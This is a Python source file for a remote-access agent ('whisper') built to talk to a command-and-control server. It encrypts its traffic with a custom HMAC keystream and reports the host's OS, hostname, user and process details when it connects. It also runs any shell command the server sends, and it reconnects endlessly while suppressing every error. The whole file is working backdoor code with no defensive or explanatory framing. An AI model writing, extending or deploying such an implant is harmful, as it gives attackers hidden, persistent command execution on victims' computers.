import socket, base64, json, os, sys, struct, hashlib, hmac, time, threading, subprocess, platform

C2_HOST = '127.0.0.1'
C2_PORT = 4443
ENCRYPTION_PASSWORD = 'whisper_secret_key'
RECONNECT_DELAY = 1

def _k(): return hashlib.pbkdf2_hmac("sha256", ENCRYPTION_PASSWORD.encode(), b"whisper_salt_2024", 100000, 32)
def _eb(p, k):
    iv = os.urandom(16); ks, c = b"", 0
    while len(ks) < len(p):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    ct = bytes(x ^ y for x, y in zip(p, ks))
    return iv + hmac.new(k, iv + ct, hashlib.sha256).digest()[:16] + ct
def _db(d, k):
    iv, tag, ct = d[:16], d[16:32], d[32:]
    if not hmac.compare_digest(tag, hmac.new(k, iv + ct, hashlib.sha256).digest()[:16]): raise ValueError("integrity")
    ks, c = b"", 0
    while len(ks) < len(ct):
        ks += hmac.new(k, iv + struct.pack(">Q", c), hashlib.sha256).digest(); c += 1
    return bytes(x ^ y for x, y in zip(ct, ks))
def enc(d): return base64.b64encode(_eb(json.dumps(d).encode(), _k()))
def dec(d): return json.loads(_db(base64.b64decode(d), _k()))
def rms(s):
    r = s.recv(4)
    if not r: return None
    sz = int.from_bytes(r, "big"); d = b""
    while len(d) < sz:
        c = s.recv(sz - len(d))
        if not c: return None
        d += c
    return dec(d)
def sms(s, d):
    p = enc(d); s.sendall(len(p).to_bytes(4, "big") + p)

_CMDS = {}

# --- shell plugin ---

def _cmd_shell(m):
    try:
        r = subprocess.run(m["cmd"], shell=True, capture_output=True, text=True, timeout=120)
        return {"output": (r.stdout + r.stderr) or "(no output)"}
    except subprocess.TimeoutExpired: return {"output": "[!] Timed out"}
    except Exception as e: return {"output": f"[!] {e}"}
_CMDS["shell"] = _cmd_shell

_CMDS['shell'] = _cmd_shell

def _cmd_info(m):
    return {"os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid(),"cwd":os.getcwd()}
_CMDS["info"] = _cmd_info

def _main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30); s.connect((C2_HOST, C2_PORT))
            sms(s, {"type":"init","os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid()})
            s.settimeout(15)
            while True:
                try:
                    m = rms(s)
                    if m is None: break
                except socket.timeout:
                    sms(s, {"type":"ping"}); continue
                if m["type"] == "exit": s.close(); return
                fn = _CMDS.get(m["type"])
                if fn:
                    try:
                        r = fn(m)
                        if r is not None: sms(s, {"type":"response",**r})
                    except Exception as e: sms(s, {"type":"response","error":str(e)})
                else:
                    sms(s, {"type":"response","error":f"Unknown command: {m['type']}"})
        except: pass
        finally:
            try: s.close()
            except: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    _main()
